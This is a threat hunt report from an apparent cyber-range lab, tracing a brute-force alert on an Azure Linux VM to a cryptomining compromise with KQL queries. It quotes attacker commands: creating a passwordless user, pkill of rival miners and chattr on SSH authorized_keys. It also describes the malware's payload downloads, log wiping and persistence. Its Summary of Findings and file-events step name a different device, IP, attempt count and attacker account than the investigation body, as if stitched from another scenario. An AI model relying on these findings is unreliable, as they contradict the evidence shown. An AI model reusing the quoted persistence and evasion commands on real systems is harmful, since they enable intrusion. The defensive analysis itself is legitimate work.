# Threat Hunt Report: Operation Jackal Spear

## Platforms and Languages Leveraged
- **Windows 10 Virtual Machines** (Microsoft Azure)
- **EDR Platform**: Microsoft Defender for Endpoint
- **Kusto Query Language (KQL)**

## Scenario
Your SOC team received an urgent email from Microsoft Azure Safeguards Team
regarding potential misuse of Azure resources. Microsoft flagged your subscription for
external reports of brute-force attacks originating from one of your IP addresses. Your
organization's reputationâ€”and your Azure subscriptionâ€”is at stake.
Your SOC Manager urgently tasks you with investigating this alert. You must determine if
there's truth to these allegations and, if so, uncover how deep the compromise goes. 

---

## Steps Taken

### 1. . Validate the Allegation:

To start the investigation, I searched the **AzureNetworkAnalytics_CL** and **`DeviceLogonEvents`** table to verify ownership of the reported IP and confirm the brute force attack pattern from our environment. Our first query shows the name, MAC, Private and Public IP, aswell as the subnetwork which displays the cyber-range, our organization, confirming that the IP does infact belong to us.

**Query Used**:
```kql
AzureNetworkAnalytics_CL
| where PublicIPAddresses_s == "20.81.228.191"
| project TimeGenerated, Name_s,MACAddress_s, PrivateIPAddresses_s, PublicIPAddresses_s, Subnetwork_s
```
![image](https://github.com/user-attachments/assets/9564a07f-8f8b-4eee-97da-339979188f94)


The second query shows that the Public IP address reported, has indeed shown patterns of brute-force attacks on the device "xxlinuxprofixxx" with 100 failed login attempts over 2 minutes using the root account. With this, we can validate the allegation.

**Query Used**:
```kql
let failure_threshold = 10;
let time_window = 720h;
let trigger_window = 60s;
DeviceLogonEvents
| where (RemoteIP contains "20.81.228.191" or RemoteIP contains "10.0.0.217")  // Filter for your compromised device IPs
| where ActionType == "LogonFailed"
| where Timestamp > ago(time_window)
| summarize FailedLogonCount = count()by bin(Timestamp, trigger_window), DeviceName,DeviceId, RemoteIP, AccountName
| where FailedLogonCount >= failure_threshold
| extend ReportId = strcat("LogonFailureAlert_", DeviceName, "_", format_datetime(Timestamp, 'yyyyMMdd_HHmmss')) // Dynamic ReportId
| order by Timestamp desc
```

### 2. Trace the Origin of Malicious Activity: 

Next, I examined the DeviceInfo table to identify the compromised host, "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", which is a linux platform. 

**Query Used**:
```kql
DeviceInfo
| where PublicIP == "20.81.228.191"
| project Timestamp,DeviceName, PublicIP, OSPlatform
```
![image](https://github.com/user-attachments/assets/9c3f2854-d717-47ca-a492-cce775273da1)

Now that we have the host, we will comb through Logon Events, File Events, and Process Events to determine malicious activity began and how the system was compromised. 

Our first look at the logon events shows that the device has several IPs that stand out: 
**Query Used**:
```kql
let failure_threshold = 10;
let time_window = 90d;
let trigger_window = 60s;
DeviceLogonEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "LogonFailed"
| where Timestamp > ago(time_window)
| summarize FailedLogonCount = count()by bin(Timestamp, trigger_window), DeviceName,DeviceId, RemoteIP, AccountName
| where FailedLogonCount >= failure_threshold
| extend ReportId = strcat("LogonFailureAlert_", DeviceName, "_", format_datetime(Timestamp, 'yyyyMMdd_HHmmss')) // Dynamic ReportId
| order by Timestamp desc
```

During the time of 0441 to 0445 on March 14th 2025, we see that the IP 8.219.145.111 has 92 failed attempts over SSHD as root, cursory reserach into the IP revelaed that it is a malicious IP via MalwareURL database. No sucessful logins were made by this IP. Next is the IP 10.0.0.217, this private IP belongs to the host and is suspsected to be a brute force test by the authorized user as seen by the account names under the attempts. The last IP 10.0.0.8 is the local scan engine in the range, although 91 attempts over 2 minutes is suspicious at a glance, this appears to be normal behavior for the local scan engine when investigating its acivity. This IP is the only one of the failed attempts to have successful logons, this is believed to be credentialed internal scanning through tenable.

Our second look will be through daily Process Events in which we see unusual activity, the first of which is the command line for - bash useradd -m testuser followed by passwd -d testuser, this means that there is a account on the device that does not need credentials to access the device, it is believed that the authorized user had created this to trigger a flag in the tenable scanning.

Further investigation sees a sucessful SSHD logon at 0546 AM March 14th, this is validated against the device logon activity from 20.169.181.216., a data center in VA. The details of the process is sshd: [accepted], followed by sh -c "/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new". What this means is that the message of the day is running which seems nornmal enough, however In the context of potential exploits, the /etc/update-motd.d/ directory can be used to run scripts as root, which can be a target for persistence mechanisms in attacks. A malicious script in this directory would be executed each time a user logs in, potentially running unauthorized commands or reconnaissance as seen with the motd.d/50-landscape-sysinfo, update-motd.d/91-release-upgrade,update-motd.d/90-updates-available  and who-q leading to a commmand to update motd fsack at reboot to determine the system's resilence. The recon chain continues with grep commands such as -q -m 1, and bash -c 'nvidia-smi -q | grep "Product Name"' to ascertain the GPU of the device leading to another logon from the same IP with the same process of MOTD following.

We would then observe that a suspect executable from the systemd that seems to be titled with obsfucation to avoid detection at nearly the same time as the Message of the day update header, I suspect that the header was manipulated to inject malicious code and trigger this exploit upon review of the SSHD Login process, the 00-header process, most of the MOTD processes, the sh -c "pkill -9 intelshell >/dev/null 2>&1", sh -c "pkill -STOP Chrome >/dev/null 2>&1", and sh -c "pkill -STOP cnrig >/dev/null 2>&1"  SHA256 Hash to be one and the same 4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483.

Based on this initial process, it seems to be killing certain services and processes such as chrome and cnrig, this seems to be indicative of exploiting the device to cryptomining and stopping competitive mining if present. The exploit would then deploy a malicious script for cryptomining with persistence mechanisms, system compromise techniques, and a focus on data exfiltration:

***Malicious Elements:***

**Remote Payload Download & Execution:**
--The script uses wget and curl to download and execute payloads from suspicious domains (e.g., dinpasiune.com and 85.31.47.99), potentially delivering a cryptominer or other malware.

**System Cleanup & Concealment:**
--Clears evidence by deleting logs (.bash_history, history -c) and critical files (e.g., /var/tmp/.update-logs).
--Deletes or disables competing malware or services by killing processes (pkill xmrig, pkill java, etc.).

**Password List Generation:**
--Generates weak default passwords for users by extracting system usernames (cat /etc/passwd) and creating combinations of usernames and weak password strings like 123456, password, Passw0rd.

**Persistence Mechanisms:**
--The script recreates critical files (/etc/sysctl.conf), updates file limits, and ensures system stability for continued operation of the malware.
--It also re-establishes itself through crontab manipulation and uses /dev/shm/.x for storing malicious files, which is commonly used for persistence.

**Crontab & SSH Key Manipulation:**
--Crontab entries are removed, potentially removing legitimate or other scheduled tasks, while setting up new ones to run the miner regularly.
--SSH keys are manipulated (chattr -iae ~/.ssh/authorized_keys) to avoid detection or disable administrative access.

**Connection Attempts & Data Exfiltration:**
--The ./network component and references to .diicot indicate potential exfiltration of sensitive data or continued control through a network communication mechanism.

**Miner Function:**
--Cleans up the environment by removing evidence and attempting to continue cryptomining operations using files like /tmp/kuak or /var/tmp/Documents/.diicot.

**SHA256:**
--The SHA256 hash provided (59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4) refers to the binary or script identified in this incident, useful for file identification in threat databases.

This would be followed by a sequence of commands from the script designed to extract valid user accounts from the system and manipulate data for further use in an attack, and another script performing several actions related to system manipulation, persistence, and concealment.

### 3. Analyzing File Events
To understand the extent of the data compromise, I searched the DeviceFileEvents table for actions initiated by the attacker under the new user account chadwick.s. I discovered that the attacker accessed and likely stole a sensitive file named CRISPR-X__Next-Generation_Gene_Editing_for_Artificial_Evolution.pdf alognside other files in a zip file named gene_editing_papers, a high-value target that could indicate a larger espionage operation targeting proprietary research.

**Query Used**:
```kql
DeviceFileEvents
| where DeviceName == "corpnet-1-ny"
| where InitiatingProcessAccountName == "chadwick.s"
| where FileName has_any ("zip")
| project
    TimeGenerated,
    DeviceName,
    InitiatingProcessAccountName,
    FileName,
    InitiatingProcessCommandLine
```

### Summary of Findings
-Compromised Device: corpnet-1-ny

-Attacker's Public IP Address: 102.37.140.95

-Number of Failed Login Attempts: 14

-Account Created by the Attacker: chadwick.s

-Stolen Files: a gene_editing_papers.zip "CRISPR-X__Next-Generation_Gene_Editing_for_Artificial_Evolution.pdf" "Genetic_Drift_in_Hyper-Evolving_Species__A_Case_Study.pdf" "Mutagenic_Pathways_and_Cellular_Adaptation.pdf" "Mutational_Therapy__Theoretical_Applications_in_Human_Enhancement.pdf" "Spontaneous_Mutations_in_Simulated Microbial Ecosystems"

### Response Taken
Upon identifying the compromised device and account, I took steps to isolate corpnet-1-ny from the network to prevent further data exfiltration. The chadwick.s account was flagged for further investigation, and incident response teams were alerted to the presence of stolen research files. Additionally, the system logs were preserved for forensic analysis and evidence gathering.
